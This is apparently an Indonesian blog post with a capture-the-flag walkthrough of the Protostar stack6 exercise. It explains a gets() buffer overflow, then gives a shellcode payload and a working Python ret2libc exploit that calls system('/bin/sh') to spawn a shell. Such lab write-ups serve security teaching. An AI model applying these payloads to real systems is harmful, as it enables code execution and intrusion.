---
layout: post
title: "Protostar: stack6"
date: 2020-08-27 20:05:03 +0700
categories: [reversing, protostar]
---

Melanjutkan ke stack6. Mari kita mulai dengan memeriksa stack6 dengan utilitas `file`.

output:
![output file stack6](/images/protostar-stack6-1.png)

Karena tidak ada perbedaan dengan sebelmunya mari kita lanjut melihat source codenya.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Jika dibandingkan dengan [stack5](/belajar-reversing-protostar-stack5) kali ini fungsi gets dimasukkan pada fungsi tersendiri dengan nama getpath. Didalam fungsi getpath terdapat pemanggilan fungsi yang tampak asing yaitu **fflush** dan **\_\_builtin_return_address**. Jika kita lihat manual dari kedua fungsi tersebut.

```bash
man flush
```

output:
![man flush](/images/protostar-stack6-2.png)

Fungsi flush ini sepertinya dapat kita abaikan. Sekarang kita lihat untuk fungsi \_\_builtin_return_address. Disini saya mencari manualnya dari google karena tidak dapat menemukannya secara local.

![manual builtin_return_address](/images/protostar-stack6-3.png)

Dapat dibaca pada paragraf pertama yang saya tandai, berdasarkan [https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html](https://gcc.gnu.org/onlinedocs/gcc/Return-Address.html) fungsi ini mengembalikan return address dari fungsi yang sedang dijalankan. Dengan kata lain fungsi tersebut akan mengembalikan isi dari eip. Berdasarkan source codenya kembalian dari fungsi ini akan disimpan dalam variabel lokal ret. Kemudian akan dilakukan pengecekan, address pada variabel ret akan di **_and_** kan (and merupakan operasi bitwise) dengan **0xbf000000** jika menghasilkan **0xbf000000** kondisi akan terpenuhi dan kita gagal. Jika kalian ingin mengetahui lebih lanjut soal operasi bitwise silahkan dibaca [disini](https://en.wikipedia.org/wiki/Bitwise_operation#AND), disini akan saya sederhanakan saja. Kondisi akan terpenuhi jika eip memiliki return address 0xbfxxxxxx dimana x dapat berupa bilangan heksadesimal apa saja.

Mari kita kerjakan terlebih dahulu stack6 ini dengan metode yang sama dengan stack5. Kita load ke gdb dan cari offsetnya.

```bash
gdb -q stack6
set disassembly-flavor intel
disas getpath
b *0x080484af
r //masukkan 100 karakter Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

Kita load stack6 ke gdb dalam mode quiet. Atur disassembly dalam mode intel. Melakukan disassembly pada fungsi getpath. Meletakkan breakpoint pada instruksi setelah pemanggilan fungsi gets. Setelah itu kita jalankan dan masukkan input 100 karakter yang kita dapatkan dari [sini](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html).

output:
![mencari offset dengan gdb](/images/protostar-stack6-4.png)

Selanjutnya kita tinggal melihat isi eip untuk mengetahui ukuran offset.

```
info frame
x/s 0xbffff7ac
```

ouput:
![masih mencari offset dengan gdb](/images/protostar-stack6-5.png)

![masih mencari offset dengan gdb](/images/protostar-stack6-6.png)

Didapatkan offset 80. Kita buat payloadnya dengan sesi ssh baru seperti pada [stack5](/belajar-reversing-protostar-stack5) dengan perubahan pada besar offset dan lokasi return address.

```bash
python -c "print( 'A' * 80 + '\xd0\xf7\xff\xbf' + '\x90'* 60 + '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68')"  > /tmp/payload
```

**0xbffff7d0** didapatkan dari menambahkan eip dengan 4byte. Sekarang kita jalankan lagi dalam gdb dengan payload yang telah kita buat.

```bash
r < /tmp/payload
```

ouput:
![jalankan dengan injeksi shellcode](/images/protostar-stack6-7.png)

Jeng jeng jeng... return address yang kita gunakan 0x**bf**fff7d0 memenuhi kondisional dan jika kita periksa ulang alamat dari stack.

```bash
r < /tmp/payload
x/100x 0xbffff7ac
```

output:
![isi stack](/images/protostar-stack6-8.png)

Dapat dipastikan bahwa kita tidak bisa menggunakan alamat stack sebagai return address. Berdasarkan [halaman resmi dari stack6](http://exploit.education/protostar/stack-six/) kita dapat menyelesaikan stack6 ini dengan 3 pendekatan:

- finding the duplicate of the payload
- ret2libc
- return orientated programming

Dari ketiga pendekatan diatas kita akan menggunakan ret2libc. **ret2libc** atau **return-to-libc** adalah serangan keamanan komputer yang biasanya dimulai dengan buffer overflow di mana alamat pengembalian subrutin pada call stack (eip) diganti dengan alamat subrutin yang sudah ada dalam memori proses, melewati fitur keamanan bit no-eksekusi (jika ada ) dan menghilangkan kebutuhan penyerang untuk memasukkan kode(shellcode) mereka sendiri -[wikipedia](https://en.wikipedia.org/wiki/Return-to-libc_attack). Dengan kata lain kita tidak perlu memasukkan shellcode pada stack, kita cukup melakukan pemanggilan fungsi yang sudah ada dalam proses yang dapat memberikan kita akses ke shell. Libc sendiri merupakan library yang sangat umum digunakan pada sistem operasi linux. Didalam libc terdapat beberapa fungsi yang dapat memberikan akses shell, salah satunya ialah fungsi system.

```bash
man system
```

output:
![output man system](/images/protostar-stack6-9.png)

Sebelum memulai membuat payload terlebih dahulu kita harus mengetahui bagaimana fungsi dipanggil dan argumen diberikan pada fungsi dengan membacanya pada halaman wikipedia [berikut ini](https://en.wikipedia.org/wiki/X86_calling_conventions) atau pada blog pak Yohanes [disini](https://yohan.es/security/buffer-overflow/basic-stack-overflow/).

Secara sederhana saat fungsi dipanggil, argumen/parameter yang diperlukan oleh fungsi tersebut akan dipush ke stack. Disusul oleh address instruksi setelah pemanggilan fungsi, address ini akan disimpan dalam eip agar saat fungsi selesai dieksekusi dapat melanjutkan kembali ke instruksi selanjutnya. Pada teknik ret2libc ini kita akan memanfaatkan fungsi system, fungsi ini membutuhkan argumen yang dalam kasus kita argumen tersebut adalah _/bin/sh_. Berbekal sedikit pengetahuan mengenai calling convention pada x86 kita akan membuat payload yang jika diilustrasikan kurang lebih seperti berikut.

![ilustrasi payload](/images/protostar-stack6-10.png)

Kita akan memenuhi buffer dan ebp dengan karakter 'A'. Pada eip kita akan memasukkan address dari fungsi system diikuti dengan address fungsi exit (sebagai return address/eip dari fungsi system). Bagian terakhir ialah '/bin/sh' sebagai argumen yang dibutuhkan oleh fungsi system.

Address fungsi system dan exit dapat dicari dengan perintah `print` pada gdb. Pastikan sebelumnya kalian telah menjalankan stack6 pada gdb.

```bash
r //jalankan stack6 paling tidak sekali
print system
print exit
```

output:
![alamat fungsi system dan exit](/images/protostar-stack6-11.png)

Sebagai argumen/parameter untuk fungsi system, string '/bin/sh', dapat kita cari dalam libc atau memasukkan secara manual melalui environment variable. Kita akan menggunakan yang sudah tersedia dalam libc. Untuk mencarinya sebenarnya bisa dengan perintah find pada gdb namun sayang sekali saya tidak berhasil sehingga saya menggunakan utilitas `strings` yang tersedia pada protostar. Terlebih dahulu cari libc yang digunakan oleh stack6.

```bash
info proc map
```

output:
![libc yang digunakan oleh stack6](/images/protostar-stack6-12.png)

libc yang digunakan oleh stack6 ialah yang saya highlight pada screenshot diatas, _/lib/libc-2.11.2.so_ dan diload pada address 0xb7e97000. Sekarang pindah pada sesi ssh lain dan gunakan perintah berikut untuk mencari lokasi string '/bin/sh'.

```bash
strings -t x -a /lib/libc-2.11.2.so | grep /bin/sh
```

Gunakanlah `man strings` untuk mengetahui fungsi dari argumen yang saya gunakan.

output:
![lokasi string /bin/sh pada libc](/images/protostar-stack6-13.png)

- system : 0xb7ecffb0
- exit : 0xb7ec60c0
- '/bin/sh' : 0x0011f3bf + 0xb7e97000 (strings mencari pada libc yang dimulai dari address 0x0, sehingga perlu ditambahkan dengan 0xb7e97000, address libc mulai di load pada stack6)

Dengan ketiga informasi address diatas, beserta offset yang kita cari diawal, kita sudah dapat membuat payload. Disini saya menggunakan bantuan python dengan module struct agar tidak perlu menerjemahkan address ke little endian secara manual. Buatlah script python baru pada directory /tmp/ , saya menggunakan text editor nano dan menyimpannya dengan nama payload.py.

```bash
nano /tmp/payload.py
```

Berikut kode payloadnya.

```python
import struct

offset=80*"A" #padding
system=struct.pack("<I", 0xb7ecffb0) #(eip)return ke system
exit=struct.pack("<I", 0xb7ec60c0) #return address setelah system dieksekusi
args=struct.pack("<I", 0xb7e97000 + 0x11f3bf) #argumen untuk system
print(offset+system+exit+args)
```

struct.pack digunakan untuk mengubah alamat hexadesimal menjadi dalam format lain, dalam hal ini dalam little endian (<I). Simpan dengan ctrl+x.

![buat payload dengan nano](/images/protostar-stack6-14.png)

Sekarang kita keluar gdb dan jalankan stack6 dengan payload baru.

```bash
python /tmp/payload.py > /tmp/payload
(cat /tmp/payload; cat) | ./stack6
```

output:
![eksekusi stack6 dengan payload baru](/images/protostar-stack6-15.png)

Berhasil! Kita mendapatkan shell, namun shell tersebut tidak mendapatkan akses root karena fungsi system mendrop privileges dari root. Gunakanlah fungsi lain yang sifatnya tidak mendrop privileges jika ingin mendapatkan akses root.
